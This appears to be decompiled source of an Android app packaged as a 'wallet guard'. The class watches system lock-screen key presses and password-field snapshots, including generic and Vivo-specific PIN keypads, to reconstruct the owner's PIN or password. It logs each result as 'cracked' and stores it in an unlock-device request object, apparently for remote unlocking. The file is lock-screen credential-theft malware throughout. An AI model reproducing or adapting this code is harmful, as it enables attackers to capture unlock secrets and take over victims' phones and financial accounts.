package com.guard.wallet.plug;

import a1.q;
import android.text.TextUtils;
import android.util.Log;
import com.guard.wallet.req.ListenPropResponse;
import com.guard.wallet.req.ListenResponseVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.utils.h;
import java.io.Serializable;
import java.util.Arrays;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

public final class c implements Serializable {
   public static final ConcurrentLinkedQueue a = new ConcurrentLinkedQueue();
   public static final LinkedList b = new LinkedList();
   public static final ScheduledExecutorService c = Executors.newSingleThreadScheduledExecutor();
   public static final AtomicReference d = new AtomicReference(null);
   public static final AtomicBoolean e = new AtomicBoolean(false);
   public static long f;
   public static String g;

   public c() {
      f = 10L;
   }

   public static void a(LinkedList var0, ReqUnlockDeviceVO var1) {
      if (!var0.isEmpty()) {
         var0.sort(new n.a(1));
         ReqUnlockDeviceVO var3 = h(var0);
         if (var3 != null && !q.B(var3.getTextCipher())) {
            StringBuilder var2 = new StringBuilder("按ID破解:");
            var2.append(var3.getTextCipher());
            Log.d("com.guard.wallet.plug.c", var2.toString());
            var1.setCipherGradeCode(var3.getCipherGradeCode());
            var1.setTextCipher(var3.getTextCipher());
         }
      }
   }

   public static void b(LinkedList var0, ReqUnlockDeviceVO var1) {
      if (!var0.isEmpty()) {
         var0.sort(new n.a(1));
         ReqUnlockDeviceVO var3 = h(var0);
         if (var3 != null && !q.B(var3.getTextCipher())) {
            StringBuilder var2 = new StringBuilder("按DESC破解:");
            var2.append(var3.getTextCipher());
            Log.d("com.guard.wallet.plug.c", var2.toString());
            if (q.B(var1.getCipherGradeCode())) {
               var1.setCipherGradeCode(var3.getCipherGradeCode());
            }

            if (q.B(var1.getTextCipher()) || e(var1.getTextCipher(), var1.getTextCipher())) {
               var1.setTextCipher(var3.getTextCipher());
            }
         }
      }
   }

   public static void c(LinkedList var0, ReqUnlockDeviceVO var1) {
      if (!var0.isEmpty()) {
         var0.sort(new n.a(1));
         ReqUnlockDeviceVO var2 = i(var0);
         if (var2 != null && !q.B(var2.getTextCipher())) {
            StringBuilder var3 = new StringBuilder("按文本破解:");
            var3.append(var2.getTextCipher());
            Log.d("com.guard.wallet.plug.c", var3.toString());
            if (q.B(var1.getCipherGradeCode())) {
               var1.setCipherGradeCode(var2.getCipherGradeCode());
            }

            if (q.B(var1.getTextCipher()) || e(var1.getTextCipher(), var1.getTextCipher())) {
               var1.setTextCipher(var2.getTextCipher());
            }
         }
      }
   }

   public static boolean d(String var0) {
      boolean var1 = q.B(var0);
      boolean var2 = false;
      if (!var1) {
         if (var0.length() < 4) {
            return false;
         } else {
            ReqUnlockDeviceVO var3 = h.g();
            if (var3 != null && !q.B(var3.getTextCipher())) {
               String var5 = var3.getTextCipher();
               if (!Objects.equals(var5, var0) && var5.startsWith(var0) || var5.endsWith(var0)) {
                  return false;
               }
            }

            var3 = h.f();
            if (var3 != null && !q.B(var3.getTextCipher())) {
               String var7 = var3.getTextCipher();
               if (!Objects.equals(var7, var0)) {
                  if (var7.startsWith(var0)) {
                     return var2;
                  }

                  if (var7.endsWith(var0)) {
                     return var2;
                  }
               }

               return true;
            } else {
               return true;
            }
         }
      } else {
         return false;
      }
   }

   public static boolean e(String var0, String var1) {
      boolean var4 = q.B(var1);
      boolean var3 = false;
      boolean var2 = var3;
      if (!var4) {
         var2 = var3;
         if (!q.B(var0)) {
            if (!Objects.equals(var0, var1) && var0.startsWith(var1)) {
               return var3;
            }

            var2 = var3;
            if (!var0.endsWith(var1)) {
               var2 = true;
            }
         }
      }

      return var2;
   }

   public static void f() {
      if (q.B(g) || !e.get()) {
         Log.d("com.guard.wallet.plug.c", "cacheResponseQueue clear");
         a.clear();
         g = null;
      }
   }

   public static void g() {
      AtomicBoolean var2 = e;
      if (!var2.get()) {
         var2.set(true);
         com.guard.wallet.helper.f var3 = new com.guard.wallet.helper.f();
         long var0 = f;
         TimeUnit var4 = TimeUnit.SECONDS;
         c.schedule(var3, var0, var4);
      }
   }

   public static ReqUnlockDeviceVO h(LinkedList var0) {
      if (!var0.isEmpty()) {
         LinkedList var2 = new LinkedList();
         LinkedList var3 = new LinkedList();
         LinkedList var1 = new LinkedList();

         for (ListenPropResponse var5 : var0) {
            if (!q.B(var5.getValue())) {
               if (var5.getValue().startsWith("com.android.systemui:id/key")) {
                  var2.add(var5.getValue().replaceFirst("com.android.systemui:id/key", ""));
               }

               if (var5.getValue().startsWith("com.android.systemui:id/VivoPinkey")) {
                  var3.add(var5.getValue().replaceFirst("com.android.systemui:id/VivoPinkey", ""));
               }

               if (var5.getValue().startsWith("com.android.systemui:id/num")) {
                  var1.add(var5.getValue().replaceFirst("com.android.systemui:id/num", ""));
               }

               if (var5.getValue().startsWith("com.android.systemui:id/char_")) {
                  var1.add(var5.getValue().replaceFirst("com.android.systemui:id/char_", ""));
               }

               if (q.D(var5.getValue()) && var5.getValue().length() == 1) {
                  var2.add(var5.getValue());
               }
            }
         }

         if (!var2.isEmpty()) {
            String var8 = TextUtils.join("", var2);
            StringBuilder var12 = new StringBuilder("依 通用 PIN码破解:");
            var12.append(var8);
            Log.d("com.guard.wallet.plug.c", var12.toString());
            ReqUnlockDeviceVO var13 = new ReqUnlockDeviceVO();
            var13.setTextCipher(var8);
            var13.setCipherGradeCode("PASSWORD_QUALITY_NUMERIC_COMPLEX");
            return var13;
         }

         if (!var3.isEmpty()) {
            String var7 = TextUtils.join("", var3);
            StringBuilder var10 = new StringBuilder("依 VIVO PIN码破解:");
            var10.append(var7);
            Log.d("com.guard.wallet.plug.c", var10.toString());
            ReqUnlockDeviceVO var11 = new ReqUnlockDeviceVO();
            var11.setTextCipher(var7);
            var11.setCipherGradeCode("PASSWORD_QUALITY_NUMERIC_COMPLEX");
            return var11;
         }

         if (!var1.isEmpty()) {
            String var6 = TextUtils.join("", var1);
            ReqUnlockDeviceVO var14 = new ReqUnlockDeviceVO();
            var14.setTextCipher(var6);
            var14.setCipherGradeCode("PASSWORD_QUALITY_ALPHANUMERIC");
            StringBuilder var9 = new StringBuilder("依 VIVO 文本密码破解:");
            var9.append(var6);
            Log.d("com.guard.wallet.plug.c", var9.toString());
            return var14;
         }
      }

      return null;
   }

   public static ReqUnlockDeviceVO i(LinkedList var0) {
      LinkedList var3 = b;
      if (!var3.isEmpty()) {
         var0.addAll(var3);
         var3.clear();
      }

      if (!var0.isEmpty()) {
         LinkedList var4 = new LinkedList();

         for (ListenPropResponse var6 : var0) {
            if (!q.B(var6.getValue())) {
               var4.add(var6.getValue());
            }
         }

         var4.sort(new n.a(0));
         int var2;
         if (!var4.isEmpty()) {
            Iterator var13 = var4.iterator();
            int var1 = 0;

            while (true) {
               var2 = var1;
               if (!var13.hasNext()) {
                  break;
               }

               String var16 = (String)var13.next();
               if (!q.B(var16) && var16.length() > var1) {
                  var1 = var16.length();
               }
            }
         } else {
            var2 = 0;
         }

         String[] var14 = new String[var2];
         Arrays.fill(var14, 0, var2, "*");

         for (String var17 : var4) {
            if (!q.B(var17)) {
               for (int var9 = 0; var9 < var17.length(); var9++) {
                  String var7 = String.valueOf(var17.charAt(var9));
                  if (!Objects.equals(var7, "*")) {
                     var14[var9] = var7;
                  }
               }
            }
         }

         String var12 = TextUtils.join("", var14);
         if (!q.B(var12)) {
            StringBuilder var15 = new StringBuilder("已破解文本密码:");
            var15.append(var12);
            Log.d("com.guard.wallet.plug.c", var15.toString());
            if (!var12.contains("*") && var12.length() == var2) {
               ReqUnlockDeviceVO var10 = new ReqUnlockDeviceVO();
               var10.setTextCipher(var12);
               String var8;
               if (q.D(var12)) {
                  var8 = "PASSWORD_QUALITY_NUMERIC_COMPLEX";
               } else {
                  var8 = "PASSWORD_QUALITY_ALPHANUMERIC";
               }

               var10.setCipherGradeCode(var8);
               return var10;
            }

            var3.addAll(var0);
         }
      }

      return null;
   }

   public static void j(ListenResponseVO var0) {
      if (var0.getResponses() != null && !var0.getResponses().isEmpty()) {
         if (!q.B(var0.getDelegateId()) && q.B(g)) {
            g = var0.getDelegateId();
         }

         StringBuilder var1 = new StringBuilder("cacheResponseQueue offer:");
         var1.append(var0.getResponses());
         Log.d("com.guard.wallet.plug.c", var1.toString());
         a.addAll(var0.getResponses());
      }
   }
}
